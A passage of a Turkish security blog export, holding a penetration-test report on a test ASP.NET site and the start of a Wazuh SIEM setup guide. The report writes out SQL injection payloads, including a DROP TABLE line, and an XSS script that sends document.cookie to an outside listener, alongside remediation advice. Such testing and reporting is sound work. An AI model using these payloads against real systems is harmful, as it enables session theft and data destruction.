olarak eri\u015filebilir ve `help-yes.html` ile `data.mdb` gibi hassas dosyalar i\xe7erir.\\n- **Etkilenen Bile\u015fen**: `http://aspnet.testsparker.com/statics/`\\n- **Etki**: Sald\u0131rganlar, k\u0131s\u0131tlanmas\u0131 gereken hassas yap\u0131land\u0131rma dosyalar\u0131na veya di\u011fer kaynaklara eri\u015febilir.\\n- **Kan\u0131t**: Dizin eri\u015filebilir ve `help-yes.html` ile `data.mdb` dosyalar\u0131 hassas veriler i\xe7erir.\\n\\n### 3.6 Hassas Bilgi \u0130f\u015fas\u0131 - Veritaban\u0131 Dosyas\u0131 (Y\xfcksek)\\n\\n- **A\xe7\u0131klama**: `/statics/` dizininde bulunan `data.mdb` dosyas\u0131 indirilebilir durumdad\u0131r ve `strings` komutuyla analiz edildi\u011finde hassas bilgiler (`mustafa` gibi potansiyel kullan\u0131c\u0131 ad\u0131 veya parola) i\xe7erir.\\n\\n- **Etkilenen Bile\u015fen**: `http://aspnet.testsparker.com/statics/data.mdb`\\n\\n- **Etki**: Sald\u0131rganlar, bu bilgileri kimlik do\u011frulama sistemlerini hedeflemek veya yetkisiz eri\u015fim elde etmek i\xe7in kullanabilir.\\n\\n- **Kan\u0131t**: `strings data.mdb` komutuyla elde edilen \xe7\u0131kt\u0131:\\n\\n  ```\\n  Standard Jet DB\\n  gr@?\\n  y[S)|*\\n  mustafa\\n  ```\\n\\n### 3.7 IIS 8.5 Hata Mesaj\u0131 ile Dizin \u0130f\u015fas\u0131 (Y\xfcksek)\\n\\n- **A\xe7\u0131klama**: IIS 8.5 sunucusu, 403.14 (Forbidden) hata mesajlar\u0131nda k\xf6k dizin yollar\u0131n\u0131 if\u015fa etmektedir (\xf6r. `C:\\\\Websites\\\\aspnet.testsparker\\\\Panel\\\\`).\\n- **Etkilenen Bile\u015fen**: Web sunucusu (IIS 8.5)\\n- **Etki**: Sald\u0131rganlar, sunucu dosya yap\u0131s\u0131n\u0131 \xf6\u011frenerek hedefe y\xf6nelik sald\u0131r\u0131lar (dosya dahil etme, dizin gezintisi) planlayabilir.\\n- **Kan\u0131t**: 403.14 hata mesajlar\u0131nda `C:\\\\Websites\\\\aspnet.testsparker\\\\Panel\\\\` gibi yollar g\xf6r\xfcl\xfcyor.\\n\\n\\n\\n### 3.8 G\xfcvensiz Y\xf6nlendirmeler (D\xfc\u015f\xfck)\\n\\n- **A\xe7\u0131klama**: `/redirect.aspx` ve `/login.aspx` gibi sayfalar, kimlik do\u011frulamas\u0131 olmadan y\xf6nlendirmeler yapar (`/default.aspx` veya `/administrator/Login.aspx`).\\n\\n- **Etkilenen Bile\u015fen**: `http://aspnet.testsparker.com/redirect.aspx`, `http://aspnet.testsparker.com/login.aspx`\\n\\n- **Etki**: Sald\u0131rganlar, y\xf6nlendirmeleri kimlik av\u0131 sitelerine veya kullan\u0131c\u0131 navigasyonunu manip\xfcle etmek i\xe7in istismar edebilir.\\n\\n\\n- **Kan\u0131t**: Gobuster \xe7\u0131kt\u0131s\u0131:\\n\\n  ```\\n  /redirect.aspx (Status: 302) [--\x3e /default.aspx]\\n  /login.aspx (Status: 302) [--\x3e /administrator/Login.aspx?r=/Dashboard/]\\n  ```\\n\\n### 3.9 WHOIS ve DNS \xdczerinden Bilgi Toplama (Bilgilendirme)\\n\\n- **A\xe7\u0131klama**: WHOIS bilgileri gizlenmi\u015f, ancak DNS kay\u0131tlar\u0131 isim sunucular\u0131n\u0131 (`NS-122-C.GANDI.NET`, `NS-223-B.GANDI.NET`, `NS-242-A.GANDI.NET`) ortaya koyuyor. rDNS kayd\u0131, sunucunun AWS \xfczerinde bar\u0131nd\u0131r\u0131ld\u0131\u011f\u0131n\u0131 g\xf6steriyor (`ec2-xxx-xxx-xxx.compute-1.amazonaws.com`).\\n- **Etkilenen Bile\u015fen**: Alan ad\u0131 ve sunucu meta verileri\\n- **Etki**: Sald\u0131rganlar, bu bilgileri ke\u015fif veya hedefe y\xf6nelik sald\u0131r\u0131lar i\xe7in kullanabilir.\\n- **Kan\u0131t**: WHOIS ve Nmap rDNS \xe7\u0131kt\u0131s\u0131.\\n\\n---\\n\\n## 4. Ba\u015far\u0131s\u0131z Olan Test Denemeleri\\n\\nA\u015fa\u011f\u0131da, test s\u0131ras\u0131nda ger\xe7ekle\u015ftirilen ancak g\xfcvenlik a\xe7\u0131\u011f\u0131 tespit edilemeyen denemeler listelenmi\u015ftir. Bu testler, uygulaman\u0131n belirli alanlarda g\xfcvenli oldu\u011funu g\xf6stermektedir, ancak s\xfcrekli izleme ve daha ileri testler \xf6nerilir.\\n\\n### 4.1 Viewstate De\u011feri Kontrol\xfc\\n\\n- **A\xe7\u0131klama**: ASP.NET uygulamas\u0131nda kullan\u0131lan Viewstate de\u011ferleri analiz edilmi\u015ftir. A\u015fa\u011f\u0131daki Viewstate de\u011ferleri Base64 ile decode edilerek \u015fifre veya hassas veri i\xe7erip i\xe7ermedi\u011fi kontrol edilmi\u015ftir:\\n  - `/wEPDwULLTE5OTE4NzY0OTlkZEGq7g8QSSx4n7ZaDhBOkGyN4b07NbSokTHWMKCzkWhu`\\n    - **Base64 Decoded**: `b\'\\\\xff\\\\x01\\\\x0f\\\\x0f\\\\x05\\\\x0b-1991876499ddA\\\\xaa\\\\xee\\\\x0f\\\\x10I,x\\\\x9f\\\\xb6Z\\\\x0e\\\\x10N\\\\x90l\\\\x8d\\\\xe1\\\\xbd;5\\\\xb4\\\\xa8\\\\x911\\\\xd60\\\\xa0\\\\xb3\\\\x91hn\'`\\n  - `/wEPDwUJMjQ5MTUxNTk1ZGR7SoZRZsldR0XCCBJ8b6HK3VNxZbwNpnWqw2kHQS3GdA==`\\n    - **Base64 Decoded**: `b\'\\\\xff\\\\x01\\\\x0f\\\\x0f\\\\x05\\\\t249151595dd{J\\\\x86Qf\\\\xc9]GE\\\\xc2\\\\x08\\\\x12|o\\\\xa1\\\\xca\\\\xddSqe\\\\xbc\\\\r\\\\xa6u\\\\xaa\\\\xc3i\\\\x07A-\\\\xc6t\'`\\n- **Sonu\xe7**: Decode edilen verilerde \u015fifre veya hassas bilgi tespit edilememi\u015ftir. Viewstate\u2019in yap\u0131land\u0131rmas\u0131 g\xfcvenli g\xf6r\xfcnmektedir.\\n\\n### 4.2 SQL Injection Denemesi (Login Sayfas\u0131)\\n\\n- **A\xe7\u0131klama**: `/login.aspx` sayfas\u0131nda SQL Injection a\xe7\u0131klar\u0131n\u0131 test etmek i\xe7in \xe7e\u015fitli payload\u2019lar (\xf6r. `\' OR \'1\'=\'1`, `1; DROP TABLE users --`) denenmi\u015ftir.\\n- **Sonu\xe7**: Hi\xe7bir payload ba\u015far\u0131l\u0131 olmam\u0131\u015f ve SQL Injection a\xe7\u0131\u011f\u0131 tespit edilememi\u015ftir. Uygulama, giri\u015fleri uygun \u015fekilde filtreliyor veya parametreli sorgular kullan\u0131yor gibi g\xf6r\xfcnmektedir.\\n\\n### 4.3 Document.cookie \xc7alma Denemesi (GuestbookList.aspx)\\n\\n- **A\xe7\u0131klama**: `http://aspnet.testsparker.com/GuestbookList.aspx` \xfczerinden document.cookie \xe7almak i\xe7in XSS denemesi yap\u0131lm\u0131\u015ft\u0131r. (\xd6rnek: `<script> new Image().src = \\"http://4.xxx.xxx.171:8000/?\\" + document.cookie;<\/script>`) Azure \xfczerinde bir sunucu (`http://4.xxx.xxx.171:8000`) a\xe7\u0131lm\u0131\u015f, portlar uygun \u015fekilde konfig\xfcre edilmi\u015f ve Python HTTP sunucusu ile dinlemeye ge\xe7ilmi\u015ftir. Ancak, backend taraf\u0131ndan (frontend taraf\u0131ndan olmad\u0131\u011f\u0131 anla\u015f\u0131ld\u0131.) giri\u015flerin yaln\u0131zca string olmas\u0131 gerekti\u011fi ve sembollerin kullan\u0131lamayaca\u011f\u0131na dair hata mesaj\u0131 al\u0131nm\u0131\u015ft\u0131r: `Please, post only strings (you cannot use only digits) and don\'t use: #,$,-,\',\\"^,+,{,}.`\\n- **Sonu\xe7**: Giri\u015f do\u011frulama k\u0131s\u0131tlamalar\u0131 nedeniyle document.cookie \xe7alma denemesi ba\u015far\u0131s\u0131z olmu\u015ftur. Bu, uygulaman\u0131n belirli XSS sald\u0131r\u0131lar\u0131na kar\u015f\u0131 koruma sa\u011flad\u0131\u011f\u0131n\u0131 g\xf6sterir.\\n- **\xd6neri**: Mevcut giri\u015f do\u011frulama mekanizmalar\u0131n\u0131 koruyun ve t\xfcm kullan\u0131c\u0131 giri\u015flerini denetleyin. Ayr\u0131ca, Content Security Policy (CSP) ve HttpOnly cookie bayraklar\u0131n\u0131 kullanarak XSS sald\u0131r\u0131lar\u0131na kar\u015f\u0131 ek koruma sa\u011flay\u0131n.\\n\\n---\\n\\n## 5. Kan\u0131tlar ve Ekran G\xf6r\xfcnt\xfcleri\\n\\n### 5.1 Stored XSS in Guestbook\\n\\n- **Payload**: `<svg><script>confirm(1)<\/script></svg>`\\n- **Sonu\xe7**: `http://aspnet.testsparker.com/guestbook.aspx` ziyaret edildi\u011finde JavaScript uyar\u0131s\u0131 \xe7al\u0131\u015f\u0131r.\\n- **Ekran G\xf6r\xfcnt\xfcs\xfc**: \\n\\n![Stored XSS Kan\u0131t\u0131](media/2.png)\\n\\n### 5.2 Error-Based SQL Injection\\n\\n- **URL ve Payload\u2019lar**:\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=asd` \u2192 `Invalid column name \'asd\'.`\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=user` \u2192 `Conversion failed when converting the nvarchar value \'dbo\' to data type int.`\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=2\' OR 1=1--` \u2192 `Incorrect syntax near \'1\'.`\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=4\'+convert(int,(SELECT @@version))--` \u2192 `Incorrect syntax near the keyword \'convert\'. Incorrect syntax near \')\'.`\\n  - **Ekran G\xf6r\xfcnt\xfcs\xfc**: \\n\\n![SQL Injection](media/4.png)\\n\\n### 5.3 Hassas Dosya \u0130f\u015fas\u0131 - Yap\u0131land\u0131rma Dosyas\u0131\\n\\n- **URL**: `http://aspnet.testsparker.com/statics/help-yes.html`\\n\\n- **\u0130\xe7erik**:\\n\\n  ```\\n  ; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CMC=1 MAPIX=1 MAPIXVER=1.0.0.1 OLEMessaging=1 [ResponseResult] ResultCode=0\\n  ```\\n\\n### 5.4 Hassas Dosya \u0130f\u015fas\u0131 - Veritaban\u0131 Dosyas\u0131\\n\\n- **URL**: `http://aspnet.testsparker.com/statics/data.mdb`\\n\\n- **\u0130\xe7erik**: `strings data.mdb` komutuyla elde edilen \xe7\u0131kt\u0131:\\n\\n  ```\\n  Standard Jet DB\\n  gr@?\\n  y[S)|*\\n  mustafa\\n  ```\\n\\n### 5.5 IIS 8.5 Dizin \u0130f\u015fas\u0131\\n\\n- **Hata Mesaj\u0131**: 403.14 hata mesajlar\u0131nda `C:\\\\Websites\\\\aspnet.testsparker\\\\Panel\\\\` gibi yollar g\xf6r\xfcl\xfcyor.\\n- **Ekran G\xf6r\xfcnt\xfcs\xfc**: \\n\\n![ISS85](media/5.png)\\n\\n### 5.6 Nmap Tarama Sonu\xe7lar\u0131\\n\\n- **Komut**: `nmap -sV -T4 aspnet.testsparker.com`\\n\\n- **\xc7\u0131kt\u0131**:\\n\\n  ```\\n  PORT    STATE SERVICE VERSION\\n  80/tcp  open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\\n  443/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\\n  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows\\n  ```\\n\\n### 5.7 Gobuster Sonu\xe7lar\u0131\\n\\n- **Komut**: `gobuster dir -u http://aspnet.testsparker.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,bak,config,txt`\\n\\n\\n### 5.8 Ffuf Sonu\xe7lar\u0131\\n\\n- **Komut**: `ffuf -u http://aspnet.testsparker.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .aspx -fc 403,404 -t 50 `\\n- **\xc7\u0131kt\u0131**: \\n  ```\\n  help.aspx               [Status: 200, Size: 3031, Words: 725, Lines: 72, Duration: 147ms]\\n  shop.aspx               [Status: 200, Size: 5806, Words: 2040, Lines: 109, Duration: 157ms]\\n  about.aspx              [Status: 200, Size: 7599, Words: 1751, Lines: 177, Duration: 158ms]\\n  Login.aspx              [Status: 302, Size: 156, Words: 6, Lines: 4, Duration: 158ms]\\n  products.aspx           [Status: 200, Size: 3726, Words: 856, Lines: 84, Duration: 148ms]\\n  ```\\n---\\n\\n## 6. Etkiler ve \xd6neriler\\n\\n### 6.1 SSL/TLS Eksikli\u011fi\\n\\n- **Etki**: Veriye m\xfcdahale, kullan\u0131c\u0131 g\xfcveninin kayb\u0131 ve olas\u0131 uyumsuzluklar.\\n- **\xd6neriler**:\\n  - Ge\xe7erli bir sertifika (\xfccretsiz olarak Let\u2019s Encrypt) kullanarak SSL/TLS uygulanabilir.\\n  - HSTS ile HTTPS y\xf6nlendirmesini zorunlu k\u0131l\u0131n.\\n  - HTTP eri\u015fimini devre d\u0131\u015f\u0131 b\u0131rakmak i\xe7in sunucu yap\u0131land\u0131rmas\u0131n\u0131 g\xfcncelleyin.\\n\\n### 6.2 Stored XSS in Guestbook\\n\\n- **Etki**: Kullan\u0131c\u0131 hesaplar\u0131n\u0131n ele ge\xe7irilmesi, veri h\u0131rs\u0131zl\u0131\u011f\u0131 ve web sitesi tahribat\u0131.\\n- **\xd6neriler**:\\n  - T\xfcm kullan\u0131c\u0131 giri\u015fleri i\xe7in giri\u015f do\u011frulama uygulay\u0131n.\\n  - Komut dosyas\u0131 y\xfcr\xfctmesini k\u0131s\u0131tlamak i\xe7in Content Security Policy (CSP) kullan\u0131n.\\n\\n### 6.3 Error-Based SQL Injection\\n\\n- **Etki**: Veritaban\u0131ndan hassas veri s\u0131z\u0131nt\u0131s\u0131, veri manip\xfclasyonu veya yetkisiz eri\u015fim.\\n- **\xd6neriler**:\\n  - Parametreli sorgular veya haz\u0131rlanm\u0131\u015f ifadeler (prepared statements) kullanarak SQL Injection\u2019\u0131 \xf6nleyin.\\n  - Kullan\u0131c\u0131 giri\u015flerini uygun \u015fekilde filtreleyin ve do\u011frulay\u0131n.\\n  - Hata mesajlar\u0131n\u0131 \xf6zelle\u015ftirerek veritaban\u0131 yap\u0131s\u0131 hakk\u0131nda bilgi s\u0131zmas\u0131n\u0131 engelleyin.\\n  - Web Application Firewall (WAF) kullanarak SQL Injection sald\u0131r\u0131lar\u0131n\u0131 tespit edin ve engelleyin.\\n\\n### 6.4 Hassas Bilgi \u0130f\u015fas\u0131 - Yap\u0131land\u0131rma Dosyas\u0131\\n\\n- **Etki**: E-posta yap\u0131land\u0131rmalar\u0131n\u0131n if\u015fas\u0131, hedefe y\xf6nelik sald\u0131r\u0131lara yol a\xe7abilir.\\n- **\xd6neriler**:\\n  - `/statics/` dizinine eri\u015fimi `webconfig` veya e\u015fde\u011feri ile k\u0131s\u0131tlay\u0131n.\\n  - Hassas dosyalar\u0131 herkese a\xe7\u0131k dizinlerden kald\u0131r\u0131n veya ta\u015f\u0131y\u0131n.\\n  - T\xfcm dizinleri istenmeyen dosya if\u015fas\u0131 i\xe7in denetleyin.\\n\\n### 6.5 Hassas Bilgi \u0130f\u015fas\u0131 - Veritaban\u0131 Dosyas\u0131\\n\\n- **Etki**: Potansiyel kullan\u0131c\u0131 adlar\u0131 veya parolalar\u0131n if\u015fas\u0131, kimlik do\u011frulama sistemlerine y\xf6nelik sald\u0131r\u0131lar\u0131 kolayla\u015ft\u0131rabilir.\\n- **\xd6neriler**:\\n  - `data.mdb` dosyas\u0131n\u0131 hemen `/statics/` dizininden kald\u0131r\u0131n veya eri\u015fimini k\u0131s\u0131tlay\u0131n.\\n  - Veritaban\u0131 dosyalar\u0131n\u0131 yaln\u0131zca g\xfcvenli, eri\u015fim kontroll\xfc ortamlarda saklay\u0131n.\\n  - \u0130f\u015fa edilen verilerin (\xf6rn. `mustafa`) hala kullan\u0131l\u0131p kullan\u0131lmad\u0131\u011f\u0131n\u0131 kontrol edin ve gerekirse kimlik bilgilerini g\xfcncelleyin.\\n\\n### 6.6 IIS 8.5 Hata Mesaj\u0131 ile Dizin \u0130f\u015fas\u0131\\n\\n- **Etki**: Sunucu dosya yap\u0131s\u0131n\u0131n if\u015fas\u0131, hedefe y\xf6nelik sald\u0131r\u0131lar\u0131 kolayla\u015ft\u0131rabilir.\\n- **\xd6neriler**:\\n  - IIS hata mesajlar\u0131n\u0131 \xf6zelle\u015ftirerek dosya yollar\u0131n\u0131n if\u015fa edilmesini \xf6nleyin (`Custom Errors` yap\u0131land\u0131rmas\u0131).\\n  - Sunucu yap\u0131land\u0131rmas\u0131n\u0131 g\xf6zden ge\xe7irerek dizin indekslemeyi devre d\u0131\u015f\u0131 b\u0131rak\u0131n.\\n\\n### 6.7 Oturum A\xe7ma ve Di\u011fer Girdi Noktalar\u0131, Y\xf6nlendirmeler\\n\\n- **Etki**: Y\xf6netimsel aray\xfczlere yetkisiz eri\u015fim riski artar.\\n- **\xd6neriler**:\\n  - G\xfc\xe7l\xfc parola politikalar\u0131 ve \xe7ok fakt\xf6rl\xfc kimlik do\u011frulama (MFA) uygulay\u0131n.\\n  - Kaba kuvvet sald\u0131r\u0131lar\u0131na kar\u015f\u0131 oturum a\xe7ma denemelerini izleyin ve IP, s\xfcre, tekrar etme durumlar\u0131na g\xf6re s\u0131n\u0131rlay\u0131n.\\n  - Yetkisiz y\xf6nlendirmeleri \xf6nlemek i\xe7in uygun oturum y\xf6netimi uygulay\u0131n.\\n\\n### 6.8 Korunmas\u0131z Dizin (`/statics/`)\\n\\n- **Etki**: Yetkisiz kullan\u0131c\u0131lara hassas kaynaklar\u0131n if\u015fas\u0131.\\n- **\xd6neriler**:\\n  - Dizin indeksleme kontrolleri ile `/statics/` eri\u015fimini reddedecek \u015fekilde sunucuyu yap\u0131land\u0131r\u0131n.\\n  - Yetkisiz dizin eri\u015fimini k\u0131s\u0131tlamak i\xe7in uygun oturum y\xf6netimi uygulay\u0131n. \\n\\n### Not\\n  - **TestCookie**: Sayfa \xfczerinde belli bir s\xfcre bulunduktan sonra TestCookie:Hello \u015feklinde bir cookie daha ekleniyor.\\n\\n\\n---\\n\\n## 7. Genel De\u011ferlendirme ve Sonu\xe7\\n\\n### 7.1 Genel G\xfcvenlik Durumu\\n\\n`http://aspnet.testsparker.com/` adresindeki web uygulamas\u0131, SSL/TLS eksikli\u011fi, stored XSS, Error-Based SQL Injection, hassas veritaban\u0131 dosyas\u0131 if\u015fas\u0131 ve IIS hata mesajlar\u0131 yoluyla dizin if\u015fas\u0131 gibi kritik g\xfcvenlik a\xe7\u0131klar\u0131 sergilemekte olup, kullan\u0131c\u0131 verileri ve sistem b\xfct\xfcnl\xfc\u011f\xfc i\xe7in ciddi riskler ta\u015f\u0131maktad\u0131r. Orta \xf6nemdeki sorunlar (a\xe7\u0131kta kalan dizinler ve hassas dosya if\u015fas\u0131), g\xfcvenlik duru\u015funu daha da zay\u0131flatmaktad\u0131r. Viewstate, login sayfas\u0131nda SQL Injection ve GuestbookList.aspx \xfczerinde cookie \xe7alma denemelerinde g\xfcvenlik a\xe7\u0131\u011f\u0131 bulunmamas\u0131 olumlu bir durumdur, ancak di\u011fer kritik sorunlar\u0131n giderilmesi i\xe7in \xf6nlem al\u0131nmas\u0131 gerekmektedir.\\n\\n### 7.2 Sonu\xe7\\n\\nS\u0131zma testi, dikkat edilmedi\u011fi takdirde ciddi sonu\xe7lara yol a\xe7abilecek birden fazla istismar edilebilir g\xfcvenlik a\xe7\u0131\u011f\u0131n\u0131 ortaya koymu\u015ftur. \xd6nerilen d\xfczeltmelerin uygulanmas\u0131yla, bu proje web uygulamas\u0131n\u0131n g\xfcvenli\u011fini \xf6nemli \xf6l\xe7\xfcde iyile\u015ftirebilir ve hassas verileri koruyabilir.\\n\\n*Bu s\u0131zma testi s\u0131ras\u0131nda zaman ve kapsam s\u0131n\u0131rlamalar\u0131 nedeniyle derinlemesine analiz yapamasam da, sistemdeki potansiyel giri\u015f noktalar\u0131n\u0131 ba\u015far\u0131yla tespit ettim ve olas\u0131 sald\u0131r\u0131 y\xfczeylerine dair genel bir fark\u0131ndal\u0131k kazand\u0131m.*\\n\\n---\\n\\n## 8. Ek Bilgiler\\n\\n### 8.1 Kullan\u0131lan Komutlar ve Payload\u2019lar\\n\\n- **Nmap**: `nmap -sV -T4 aspnet.testsparker.com`\\n- **Gobuster**: `gobuster dir -u http://aspnet.testsparker.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x aspx,bak,config,txt`\\n- **Ffuf**: `ffuf -u http://aspnet.testsparker.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -e .aspx -fc 403,404 -t 50`\\n- **Strings**: `strings data.mdb`\\n- **XSS Payload**: `<svg><script>confirm(1)<\/script></svg>`\\n- **SQL Injection Payload\u2019lar**:\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=asd`\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=user`\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=2\' OR 1=1--`\\n  - `http://aspnet.testsparker.com/Products.aspx?pId=4\'+convert(int,(SELECT @@version))--`\\n  - Login sayfas\u0131nda: `\' OR \'1\'=\'1`, `1; DROP TABLE users --` (ba\u015far\u0131s\u0131z)\\n- **Cookie \xc7alma Denemesi**: Azure sunucusu (`http://4.xxx.xxx.171:8000`) \xfczerinde Python HTTP sunucusu ile document.cookie \xe7alma (ba\u015far\u0131s\u0131z)\\n\\n### 8.2 \u0130leti\u015fim Bilgileri\\n\\nDaha fazla ayr\u0131nt\u0131 ve ileti\u015fim i\xe7in: [Berk Ali Er\xe7elik](https://github.com/berkercelik)"},{"id":"wazuh-ile-siem-ortami","metadata":{"permalink":"/b-log/blog/wazuh-ile-siem-ortami","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2025-05-09/2025-05-09-wazuh-ile-siem-ortami.md","source":"@site/blog/2025-05-09/2025-05-09-wazuh-ile-siem-ortami.md","title":"Wazuh ile SIEM Ortam\u0131 Haz\u0131rlama","description":"1. Sanal Ortam Haz\u0131rlama","date":"2025-05-09T00:00:00.000Z","tags":[{"inline":false,"label":"Siber G\xfcvenlik","permalink":"/b-log/blog/tags/siberguvenlik","description":"G\xfcvenlik a\xe7\u0131klar\u0131, s\u0131zma testleri ve savunma teknikleri"},{"inline":false,"label":"Sistem Y\xf6netimi","permalink":"/b-log/blog/tags/sistemyonetimi","description":"Sistem y\xf6neticili\u011fi, sunucu yap\u0131land\u0131rma ve y\xf6netimi konular\u0131"}],"readingTime":4.355,"hasTruncateMarker":true,"authors":[{"name":"Berk Ali Er\xe7elik","title":"Cyber Security & Full Stack Web Dev","url":"https://github.com/berkercelik","page":{"permalink":"/b-log/blog/authors/berkercelik"},"socials":{"github":"https://github.com/berkercelik","linkedin":"https://www.linkedin.com/in/berkaliercelik/"},"imageURL":"https://avatars.githubusercontent.com/u/72663666?v=4","key":"berkercelik"}],"frontMatter":{"slug":"wazuh-ile-siem-ortami","title":"Wazuh ile SIEM Ortam\u0131 Haz\u0131rlama","authors":["berkercelik"],"tags":["siberguvenlik","sysadmin"]},"unlisted":false,"prevItem":{"title":"Testsparker ASP.NET S\u0131zma Testi & Zaafiyet Analizi Raporu","permalink":"/b-log/blog/testsparker-sizma-testi-aspnet"},"nextItem":{"title":"EDR (Endpoint Detection and Response) Nedir? ve EDR Nas\u0131l \xc7al\u0131\u015f\u0131r?","permalink":"/b-log/blog/edr-nedir-ve-edr-nasil-calisir"}},"content":"## 1. Sanal Ortam Haz\u0131rlama\\n\\nBu \xf6rnek SIEM senaryosunda Windows Server 2019 (Versiyon 1809) ve Ubuntu 22.04.5 LTS Desktop i\u015fletim sistemlerini kulland\u0131m. Windows i\xe7in 2-4 GB, 2 CPU ve Linux i\xe7in 4 GB, 2 CPU \xf6nerilen de\u011ferlerini kulland\u0131m. Windows Server \xfczerinde Ayarlar \\\\> Remote Desktop (Uzak Masa\xfcst\xfc) sekmesinden RDP\'yi sald\u0131rmak \xfczere senaryo gere\u011fi a\xe7t\u0131m. \x3c!-- truncate --\x3e\\n\\n![](media/image1.png)\\n\\n![](media/image30.png)\\n\\nWindows Server IP: 192.168.28.129\\n\\nUbuntu IP: 192.168.28.131\\\\\\n\\\\\\nUbuntu kurulumunu herhangi bir ek ayar yapmadan, sadece **net-tools, curl** gibi paketleri kurarak tamamlad\u0131m. \u0130ki makineyi de VMware \xfczerinde NAT a\u011f\u0131n\u0131 se\xe7erek aya\u011fa kald\u0131rd\u0131m. \u0130kisinin de ayn\u0131 a\u011fda oldu\u011fundan emin oldum.\\n\\n![](media/image2.png)\\n\\n30 GB ve \xfczeri disk alan\u0131 tan\u0131mlaman\u0131z daha iyi olacakt\u0131r.\\n\\n## 2. Wazuh Server Kurulumu\\n\\n![](media/image3.png)\\n\\nBu a\u015famada Wazuh\'un kendi dok\xfcman\u0131n\u0131 kullanarak ilerledim.\\\\\\n\\"[Installation guide \xb7 Wazuh documentation](https://documentation.wazuh.com/current/installation-guide/index.html)\\" sayfas\u0131ndan s\u0131ras\u0131yla Wazuh Indexer, Wazuh Server ve Dashboard\'\u0131n kurulumunu anlataca\u011f\u0131m. Kendileri iki \xe7e\u015fit kurulum sunuyor. Ad\u0131m ad\u0131m olan daha detayl\u0131 ve Destekli Kurulum olan daha pratik bir \u015fekilde ilerliyor. Daha h\u0131zl\u0131 ilerlemek i\xe7in Destekli kurulum sayfalar\u0131ndan ilerledim.\\\\\\n\xd6ncelikle \\"wazuh\\" isimli bir dosya a\xe7arak i\u015flemlere buradan a\xe7t\u0131\u011f\u0131m terminalle devam ettim.\\n\\nDok\xfcman\u0131 takip ederek;\\n```\\ncurl -sO https://packages.wazuh.com/4.11/wazuh-install.sh\\n\\ncurl -sO https://packages.wazuh.com/4.11/config.yml\\n```\\nkomutlar\u0131yla gerekli ilk dosyalar\u0131 indirdim. \\"config.yml\\" dosyas\u0131nda Wazuh Server olarak kullanaca\u011f\u0131m Ubuntu makinenin IP\'sini uygun alanlara yazd\u0131m.\\n\\n![](media/image4.png)\\n\\n![](media/image5.png)\\n\\n![](media/image6.png)\\nDaha sonra `bash wazuh-install.sh \\\\--generate-config-files` komutuyla kurulum i\xe7in gerekli\\\\\\n\\"wazuh-install-files.tar\\" dosyas\u0131n\u0131 olu\u015fturdum.\\n```\\nbash wazuh-install.sh \\\\--wazuh-indexer node-1 ile Indexer kurulumu, ard\u0131ndan\\n\\nbash wazuh-install.sh \\\\--start-cluster komutu ile Indexer\'i ba\u015flatt\u0131m.\\n```\\n![](media/image8.png)\\n\\nBu kurulumdan sonra a\u015fa\u011f\u0131daki komutla kurulumda tan\u0131mlanan node-1 i\xe7in olu\u015fturulan Keystore indexer_username ve indexer_password de\u011ferlerini bir kenara kaydediyoruz.\\\\\\n**sudo** ile\\n```\\nsudo tar -axf wazuh-install-files.tar wazuh-install-files/wazuh-passwords.txt -O | grep -P \\"\\\\\'admin\\\\\'\\" -A 1\\n```\\n![](media/image9.png)\\n\\n\\\\# (Bu \u015fifre de\u011feri \xf6nemsiz oldu\u011fu i\xe7in bu rehberde gizleme gere\u011fi duymad\u0131m.)\\n\\nDaha sonra `curl -k -u admin:<Admin_\u015fifreniz> https://<Wazuh_Indexer_IPniz>:9200` komutuyla beraber cluster kontrol\xfc yapt\u0131m. \\n\\n![](media/image10.png)\\n\\nHer \u015fey yolunda g\xf6z\xfck\xfcyor.\\n\\nBir sonraki ad\u0131mda `bash wazuh-install.sh --wazuh-server wazuh-1` komutuyla Wazuh Server kurulumu yapt\u0131m. Kurulumlar bazen uzun s\xfcrebilir, i\u015flem tamamen bitene kadar iptal etmeyin.\\\\\\nSorunsuz kurulduktan sonra `bash wazuh-install.sh --wazuh-dashboard dashboard` komutuyla Ubuntu taraf\u0131ndaki son kurulumu yapt\u0131m. Dashboard taraf\u0131nda varsay\u0131lan port 443 olarak belirleniyor. Kurulumdan sonra giri\u015f yapmam\u0131z i\xe7in ayn\u0131 username:password ekrana \xe7\u0131k\u0131yor.\\n\\n![](media/image11.png)\\n\\nKontrol etmek i\xe7in giri\u015f yap\u0131yoruz. Ve API do\u011fru \u015fekilde ayarlanm\u0131\u015f, \xe7al\u0131\u015f\u0131r durumda g\xf6z\xfck\xfcyor.\\n\\n![](media/image12.png)\\n\\n![](media/image13.png)\\n![](media/image14.png)\\n![](media/image15.png)\\n\\nAyn\u0131 zamanda \\n```\\nsudo systemctl status wazuh-manager \\nsudo systemctl status filebeat\\nsudo systemctl status wazuh-indexer \\n```\\ngibi komutlarla servislerin sistem \xfczerinden durumlar\u0131n\u0131 kontrol ettim.\\n\\n## 3. Wazuh Agent Kurulumu (Windows)\\n\\nWindows Server taraf\u0131nda internete rahat eri\u015febilmek i\xe7in \xf6ncelikle Server Manager Local Server k\u0131sm\u0131ndan \\"IE Enhanced Security Configuration\\" k\u0131sm\u0131n\u0131 Off durumuna getiriyoruz.\\n\\n![](media/image16.png)\\n\\nDaha sonra farkl\u0131 bir taray\u0131c\u0131 indirip oradan devam edebilirsiniz veya do\u011frudan\\n\\n\\"[Installing Wazuh agents on Windows endpoints - Wazuh agent](https://documentation.wazuh.com/current/installation-guide/wazuh-agent/wazuh-agent-package-windows.html)\\" sayfas\u0131nda bulunan Windows Installer \\".msi\\" dosyas\u0131n\u0131 